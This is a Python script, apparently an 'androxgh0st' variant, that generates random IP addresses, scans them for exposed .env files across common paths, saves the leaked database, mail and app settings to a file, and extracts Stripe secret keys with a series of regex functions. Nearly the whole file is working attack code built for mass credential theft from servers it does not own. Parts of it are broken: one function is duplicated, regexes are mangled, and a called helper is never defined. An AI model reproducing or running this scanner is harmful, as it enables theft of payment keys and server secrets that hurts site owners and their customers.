import concurrent.futures
import os
import random
import urllib.request

try:
    import requests
except:
    os.system("pip3 install requests")
    import requests

from multiprocessing.dummy import Pool
from re import findall as reg

#Functions ---------------

def connection_check():
   try:
    urllib.urlopen('http://google.com', timeout=2)
    return True
   except:
    return False

def valid(hayuk):
        try:
            r = requests.get('http://{}'.format(hayuk), allow_redirects=True, verify=False, timeout=5)
            if r.status_code == 200:
                print(hayuk, '-> LIVE IP')
                open('ips-live.txt', 'a').write(hayuk+'\n')
            elif '<title>' in r.text:
                print(hayuk, '-> LIVE IP')
                open('ips-live.txt', 'a').write(hayuk+'\n')
            else:
              r = requests.get('https://{}'.format(hayuk), verify=True, allow_redirects=True, timeout=5)
              if r.status_code == 200:
               print(hayuk, '-> LIVE IP')
               open('ips-live.txt', 'a').write(hayuk+'\n')
              elif '<title>' in r.text:
               print(hayuk, '-> LIVE IP')
               open('ips-live.txt', 'a').write(hayuk+'\n')
              else:
                return

        except:
            print(hayuk, '-> DEAD')

class androxgh0st:
    def get_stripe_one(self, text, url):
        try:
            if "STRIPE" in text:
                if "REACT_APP_STRIPE_SECRET_KEY=" in text:
                    try:
                        ska = reg(
                            '\REACT_APP_STRIPE_SECRET_KEY=(.*?)\n', text)[0]
                    except:
                        ska = ''
                elif '<td>REACT_APP_STRIPE_SECRET_KEY</td>' in text:
                    try:
                        ska = reg(
                            '<td>REACT_APP_STRIPE_SECRET_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                    except:
                        ska = ''
                build = 'URL: '+str(url)+'\nSK: '+str(ska)
                remover = str(build).replace('\r', '')
                save = open('sk.txt', 'a')
                save.write(remover+'\n\n')
                save.close()
                chksks(f'{ska}')
                return True
            else:
                return False
        except:
            return False

    def get_stripe_two(self, text, url):
        try:
            if "STRIPE" in text:
                if "STRIPE_LIVE_SECRET_KEY=" in text:

                    try:
                        skb = reg('\STRIPE_LIVE_SECRET_KEY=(.*?)\n', text)[0]
                    except:
                        skb = ''
                elif '<td>STRIPE_LIVE_SECRET_KEY</td>' in text:

                    try:
                        skb = reg(
                            '<td>STRIPE_LIVE_SECRET_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                    except:
                        skb = '/'
                build = 'URL: '+str(url)+'\nSK: '+str(skb)
                remover = str(build).replace('\r', '')
                save = open('sk.txt', 'a')
                save.write(remover+'\n\n')
                save.close()
                chksks(f'{skb}')

                return True
            else:
                return False
        except:
            return False

    def get_stripe_two(self, text, url):
        try:
            if "STRIPE" in text:
                if "STRIPE_LIVE_SECRET_KEY=" in text:
                    try:
                        skb = reg('STRIPE_LIVE_SECRET_KEY=(.*?)', text)[0]
                    except:
                        skb = ''
                elif '<td>STRIPE_LIVE_SECRET_KEY</td>' in text:
                    try:
                        skb = reg(
                        '<td>STRIPE_LIVE_SECRET_KEY</td>s+<td><pre.*>(.*?)</span>', text)[0]
                    except:
                        skb = '/'
                build = 'URL: '+str(url)+'nSK: '+str(skb)
                remover = str(build).replace('', '')
                save = open('sk.txt', 'a')
                save.write(remover+'\n\n')
                save.close()
                chksks(f'{skb}')
                return True
            else:
                return False
        except:
            return False
    def get_stripe_three(self, text, url):
        try:
            if "STRIPE" in text:
                if "STRIPE_SECRET_KEY=" in text:
                    try:
                        skc = reg('STRIPE_SECRET_KEY=(.*?)', text)[0]
                    except:
                        skc = '/'
                elif '<td>STRIPE_SECRET_KEY</td>' in text:
                    try:
                        skc = reg(
                            '<td>STRIPE_SECRET_KEY</td>s+<td><pre.*>(.*?)</span>', text)[0]
                    except:
                        skc = '/'
                build = 'URL: '+str(url)+'nSK: '+str(skc)
                remover = str(build).replace('', '')
                save = open('sk.txt', 'a')
                save.write(remover+'\n\n')
                save.close()
                chksks(f'{skc}')
                return True
            else:
                return False
        except:
            return False
    def get_stripe_four(self, text, url):
        try:
            if "STRIPE" in text:
                if "STRIPE_API_KEY=" in text:
                    try:
                        skd = reg('STRIPE_API_KEY=(.*?)', text)[0]
                    except:
                        skd = '/'
                elif '<td>STRIPE_API_KEY</td>' in text:
                    try:
                        skd = reg(
                            '<td>STRIPE_API_KEY</td>s+<td><pre.*>(.*?)</span>', text)[0]
                    except:
                        skd = '/'
                build = 'URL: '+str(url)+'nSK: '+str(skd)
                remover = str(build).replace('', '')
                save = open('sk.txt', 'a')
                save.write(remover+'\n\n')
                save.close()
                chksks(f'{skd}')
                return True
            else:
                return False
        except:
            return False
    def get_stripe_five(self, text, url):
        try:
            if "STRIPE" in text:
                if "STRIPE_SK_LIVE=" in text:
                    try:
                        skf = reg('STRIPE_SK_LIVE=(.*?)n', text)[0]
                    except:
                        skf = '/'
                elif '<td>STRIPE_SK_LIVE</td>' in text:
                    try:
                        skf = reg(
                            '<td>STRIPE_SK_LIVE</td>s+<td><pre.*>(.*?)</span>', text)[0]
                    except:
                        skf = '/'
                build = 'URL: '+str(url)+'nSK: '+str(skf)
                remover = str(build).replace('', '')
                save = open('sk.txt', 'a')
                save.write(remover+'\n\n')
                save.close()
                chksks(f'{skf}')
                return True
            else:
                return False
        except:
            return False
    def get_stripe_six(self, text, url):
        try:
            if "STRIPE" in text:
                if "STRIPE_SECRET=" in text:
                    try:
                        skg = reg('STRIPE_SECRET=(.*?)n', text)[0]
                    except:
                        skg = '/'
                elif '<td>STRIPE_SECRET</td>' in text:
                    try:
                        skg = reg(
                            '<td>STRIPE_SECRET</td>s+<td><pre.*>(.*?)</span>', text)[0]
                    except:
                        skg = '/'
                build = 'URL: '+str(url)+'nSK: '+str(skg)
                remover = str(build).replace('', '')
                save = open('sk.txt', 'a')
                save.write(remover+'\n\n')
                save.close()
                chksks(f'{skg}')
                return True
            else:
                return False
        except:
            return False
    def get_stripe_seven(self, text, url):
        try:
            if "STRIPE" in text:
                if "STRIPE_SK=" in text:
                    try:
                        skh = reg('STRIPE_SK=(.*?)n', text)[0]
                    except:
                        skh = '/'
                elif '<td>STRIPE_SK</td>' in text:
                    try:
                        skh = reg(
                            '<td>STRIPE_SK</td>s+<td><pre.*>(.*?)</span>', text)[0]
                    except:
                        skh = '/'
                build = 'URL: '+str(url)+'nSK: '+str(skh)
                remover = str(build).replace('', '')
                save = open('sk.txt', 'a')
                save.write(remover+'\n\n')
                save.close()
                chksks(f'{skh}')
                return True
            else:
                return False
        except:
            return False
    def get_stripe_eight(self, text, url):
        try:
            if "SK" in text:
                if "SK_LIVE=" in text:
                    try:
                        ski = reg('SK_LIVE=(.*?)n', text)[0]
                    except:
                        ski = '/'
                elif '<td>SK_LIVE</td>' in text:
                    try:
                        ski = reg(
                            '<td>SK_LIVE</td>s+<td><pre.*>(.*?)</span>', text)[0]
                    except:
                        ski = '/'
                build = 'URL: '+str(url)+'nSK: '+str(ski)
                remover = str(build).replace('', '')
                save = open('sk.txt', 'a')
                save.write(remover+'\n\n')
                save.close()
                chksks(f'{ski}')
                return True
            else:
                return False
        except:
            return False
    def get_stripe_nine(self, text, url):
        try:
            if "STRIPE" in text:
                if "SK_STRIPE=" in text:
                    try:
                        skj = reg('SK_STRIPE=(.*?)n', text)[0]
                    except:
                        skj = '/'
                elif '<td>SK_STRIPE</td>' in text:
                    try:
                        skj = reg(
                            '<td>SK_STRIPE</td>s+<td><pre.*>(.*?)</span>', text)[0]
                    except:
                        skj = '/'
                build = 'URL: '+str(url)+'nSK: '+str(skj)
                remover = str(build).replace('', '')
                save = open('sk.txt', 'a')
                save.write(remover+'\n\n')
                save.close()
                chksks(f'{skj}')
                return True
            else:
                return False
        except:
            return False
    def get_stripe_ten(self, text, url):
        try:
            if "SK" in text:
                if "SK=" in text:
                    try:
                        ske = reg('SK=(.*?)n', text)[0]
                    except:
                        ske = '/'
                elif '<td>SK</td>' in text:
                    try:
                        ske = reg(
                            '<td>SK</td>s+<td><pre.*>(.*?)</span>', text)[0]
                    except:
                        ske = '/'
                build = 'URL: '+str(url)+'nSK: '+str(ske)
                remover = str(build).replace('', '')
                save = open('sk.txt', 'a')
                save.write(remover+'\n\n')
                save.close()
                chksks(f'{ske}')
                return True
            else:
                return False
        except:
            return False
def env(url):
    link = url
    if "://" in url:
            url = url
    else:
            url = "http://"+url
    if url.endswith('/'):
            url = url[:-1]
    try:
         uriPATH = ['/','local/', 'admin/', 'dev/', 'api/', 'public/', 'app/', 'core/', 'data/', 'api1/', 'api2/', 'api3/']
         for PATHS in uriPATH:
                keys = ['DB_HOST=', 'MAIL_HOST=', 'MAIL_USERNAME=', 'APP_ENV=']
                r = requests.get(f'{url}{PATHS}.env', verify=False, timeout=10, allow_redirects=False)
                if r.status_code == 200:
                    if any(key in r.text for key in keys):
                     print(url, '-> FOUND')
                     open('env.txt', 'a').write('Url: '+url+'\n'+r.text+'\n')
                     chksks(f'{url}{PATHS}.env')
                    try:
                     androxgh0st().get_stripe_one(r.text, url)
                     androxgh0st().get_stripe_two(r.text, url)
                     androxgh0st().get_stripe_three(r.text, url)
                     androxgh0st().get_stripe_four(r.text, url)
                     androxgh0st().get_stripe_five(r.text, url)
                     androxgh0st().get_stripe_six(r.text, url)
                     androxgh0st().get_stripe_seven(r.text, url)
                     androxgh0st().get_stripe_eight(r.text, url)
                     androxgh0st().get_stripe_nine(r.text, url)
                     getskten = androxgh0st().get_stripe_ten(r.text, url)
                    except:
                     return
    except:
        return
def combo():
        a = random.randrange(0, 255, 1)
        b = random.randrange(0, 255, 1)
        c = random.randrange(0, 255, 1)
        d = random.randrange(0, 255, 1)
        IPs = str(a) + '.' + str(b) + '.' + str(c) + '.' + str(d)
        env(IPs)
#Start ---------------
print("""
1. IPs Generator
2. Check IPs
3. ENVs Scanner + Debug
4. 1 + 3 (IPs Generator + ENVs Scanner + Debug)\\n\\n""")
print('Choose option from above')
user_choice = str(input('>>> '))
#IPs generator ---------------
if user_choice == "1":
    print('Quantity?')
    brapa = str(input('>>> '))
    os.system('cls' if os.name == 'nt' else 'clear')
    print("Generating...")
    for i in range(0, int(brapa)):
        a = random.randrange(0, 255, 1)
        b = random.randrange(0, 255, 1)
        c = random.randrange(0, 255, 1)
        d = random.randrange(0, 255, 1)
        ip = str(a) + '.' + str(b) + '.' + str(c) + '.' + str(d)
        open('ip.txt', 'a').write(ip+'\n')
    os.system('cls' if os.name == 'nt' else 'clear')
    print('IPs generated')
#IPs checker ---------------
elif user_choice == '2':
        os.system('cls' if os.name == 'nt' else 'clear')
        print('IPs list (txt)?')
        file = input('>>> ')
        print('Thread?')
        thr = int(input('>>> '))
        ase = open(file, 'r').read().splitlines()
        p = Pool((thr))
        os.system('cls' if os.name == 'nt' else 'clear')
        print("Checking...")
        p.map(valid, ase)
#ENVs extractor ---------------
elif user_choice == '3':
        os.system('cls' if os.name == 'nt' else 'clear')
        print('IPs list (txt)?')
        file = input('>>> ')
        print('Thread?')
        thr = int(input('>>> '))
        ase = open(file, 'r').read().splitlines()
        p = Pool((thr))
        os.system('cls' if os.name == 'nt' else 'clear')
        print("Checking...")
        p.map(env, ase)
#IPs Generator + ENVs extractor ---------------
elif user_choice == '4':
        os.system('cls' if os.name == 'nt' else 'clear')
        print('IPs?')
        ips_quantity = int(input('>>> '))
        print('Thread?')
        thr = int(input('>>> '))
        os.system('cls' if os.name == 'nt' else 'clear')
        print("Checking...")
        with concurrent.futures.ThreadPoolExecutor(max_workers=(thr)) as executor:
            worker_to_queue = {
                executor.submit(combo): x for x in range(ips_quantity)
            }
            for worker in concurrent.futures.as_completed(worker_to_queue):
                worker_to_queue[worker]
        os.system('cls' if os.name == 'nt' else 'clear')
        print("Success...")
#Unknown ---------------
else:
        os.system('cls' if os.name == 'nt' else 'clear')
        print('Unknown Selection')
